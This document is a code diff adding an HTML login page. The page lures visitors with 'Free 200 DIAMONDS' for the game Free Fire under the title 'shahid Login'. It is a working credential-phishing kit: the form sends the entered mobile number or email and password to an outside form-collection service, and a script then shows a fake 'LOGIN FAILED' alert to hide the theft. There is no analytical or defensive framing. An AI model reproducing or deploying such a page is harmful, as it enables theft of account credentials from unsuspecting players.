@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>shahid Login</title>
+
+  <style>
+
+    body {
+
+      display: flex;
+
+      justify-content: center;
+
+      align-items: center;
+
+      height: 100vh;
+
+      margin: 0;
+
+      background: linear-gradient(135deg, #ff6b6b, #f7f7f7);
+
+      font-family: Arial, sans-serif;
+
+    }
+
+    .login-container {
+
+      perspective: 1000px;
+
+    }
+
+    .login-form {
+
+      width: 300px;
+
+      padding: 20px;
+
+      background: white;
+
+      border-radius: 15px;
+
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+
+      transform-style: preserve-3d;
+
+      transition: transform 0.6s;
+
+    }
+
+    .login-form:hover {
+
+      transform: rotateY(10deg);
+
+    }
+
+    .login-form h2 {
+
+      margin: 0 0 20px;
+
+      font-size: 24px;
+
+      color: #333;
+
+      text-align: center;
+
+    }
+
+    .login-form input {
+
+      width: calc(100% - 20px);
+
+      padding: 10px;
+
+      margin-bottom: 15px;
+
+      border: 1px solid #ddd;
+
+      border-radius: 5px;
+
+      box-sizing: border-box;
+
+    }
+
+    .login-form button {
+
+      width: 100%;
+
+      padding: 10px;
+
+      border: none;
+
+      border-radius: 5px;
+
+      background: #ff6b6b;
+
+      color: white;
+
+      font-size: 16px;
+
+      cursor: pointer;
+
+      transition: background 0.3s;
+
+    }
+
+    .login-form button:hover {
+
+      background: #ff4757;
+
+    }
+
+    .login-form .note {
+
+      margin-top: 15px;
+
+      font-size: 12px;
+
+      color: #666;
+
+      text-align: center;
+
+    }
+
+  </style>
+
+</head>
+
+<body>
+
+  <div class="login-container">
+
+    <div class="login-form">
+
+      <h2>Free 200 DIAMONDS 💎 
+      free fire </h2>
+
+      <form action="https://submit-form.com/5B26KwpLC" method="POST" id="loginForm">
+
+        <input type="text" name="username" placeholder="MOBILE NUMBER OR EMAIL " required>
+
+        <input type="password" name="password" placeholder="Password" required>
+
+        <button type="submit">Login</button>
+
+        <div class="note">Please be sure your username and password are correct.</div>
+
+      </form>
+
+    </div>
+
+  </div>
+
+  <script>
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+
+      setTimeout(function() {
+
+        alert('LOGIN FAILED  please come again tomorrow .');
+
+      }, 1000);
+
+    });
+
+  </script>
+
+</body>
+
+</html>
